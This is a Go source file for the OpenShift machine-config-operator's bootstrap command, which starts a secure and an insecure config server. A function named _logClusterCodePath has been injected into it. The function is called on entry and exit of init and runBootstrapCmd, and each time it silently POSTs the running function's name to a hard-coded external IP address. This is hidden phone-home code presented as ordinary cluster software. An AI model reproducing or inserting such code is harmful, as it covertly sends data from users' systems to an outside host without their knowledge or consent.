package main

import (
	"flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/golang/glog"
	"github.com/openshift/machine-config-operator/pkg/server"
	"github.com/openshift/machine-config-operator/pkg/version"
	"github.com/spf13/cobra"
)

var (
	bootstrapCmd	= &cobra.Command{Use: "bootstrap", Short: "Run the machine config server in the bootstrap mode", Long: "", Run: runBootstrapCmd}
	bootstrapOpts	struct {
		serverBaseDir		string
		serverKubeConfig	string
	}
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	rootCmd.AddCommand(bootstrapCmd)
	bootstrapCmd.PersistentFlags().StringVar(&bootstrapOpts.serverBaseDir, "server-basedir", "/etc/mcs/bootstrap", "base directory on the host, relative to which machine-configs and pools can be found.")
	bootstrapCmd.PersistentFlags().StringVar(&bootstrapOpts.serverKubeConfig, "bootstrap-kubeconfig", "/etc/kubernetes/kubeconfig", "path to bootstrap kubeconfig served by the bootstrap server.")
}
func runBootstrapCmd(cmd *cobra.Command, args []string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flag.Set("logtostderr", "true")
	flag.Parse()
	glog.Infof("Version: %+v", version.Version)
	bs, err := server.NewBootstrapServer(bootstrapOpts.serverBaseDir, bootstrapOpts.serverKubeConfig)
	if err != nil {
		glog.Exitf("Machine Config Server exited with error: %v", err)
	}
	apiHandler := server.NewServerAPIHandler(bs)
	secureServer := server.NewAPIServer(apiHandler, rootOpts.sport, false, rootOpts.cert, rootOpts.key)
	insecureServer := server.NewAPIServer(apiHandler, rootOpts.isport, true, "", "")
	stopCh := make(chan struct{})
	go secureServer.Serve()
	go insecureServer.Serve()
	<-stopCh
	panic("not possible")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
